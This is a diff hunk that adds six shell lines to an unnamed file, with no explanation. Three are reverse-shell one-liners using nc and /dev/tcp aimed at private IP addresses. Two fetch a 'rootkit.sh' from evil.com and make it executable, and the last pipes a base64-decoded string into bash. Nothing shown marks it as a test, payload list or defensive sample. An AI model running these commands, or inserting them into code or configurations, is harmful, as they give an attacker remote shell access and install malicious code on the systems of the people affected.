@@ -1,0 +1,6 @@
+nc -e /bin/sh 192.168.1.5 8080
+/bin/bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+mkfifo /tmp/pipe; /bin/sh 0</tmp/pipe | nc 192.168.1.1 1234 1>/tmp/pipe
+wget http://evil.com/rootkit.sh
+chmod +x rootkit.sh
+base64 -d <<< "ZXZpbCBjb21tYW5k" | /bin/bash
